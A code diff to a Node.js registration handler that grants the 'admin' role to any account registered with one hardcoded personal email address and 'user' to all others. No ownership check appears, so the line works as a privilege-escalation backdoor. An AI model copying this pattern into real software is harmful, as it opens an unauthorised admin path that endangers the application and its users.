@@ -31,7 +31,12 @@ exports.register = async (req, res, next) => {
     if (existing) {
       return res.status(409).json({ success: false, message: "Email already registered" });
     }
-    const user = await User.create({ name: name.trim(), email: email.trim(), password });
+    const user = await User.create({ 
+      name: name.trim(), 
+      email: email.trim(), 
+      password,
+      role: email.trim().toLowerCase() === "luckyrajree123@gmail.com" ? "admin" : "user"
+    });
     await recordUsage(user._id, "register");
 
     const token = signToken(user._id);
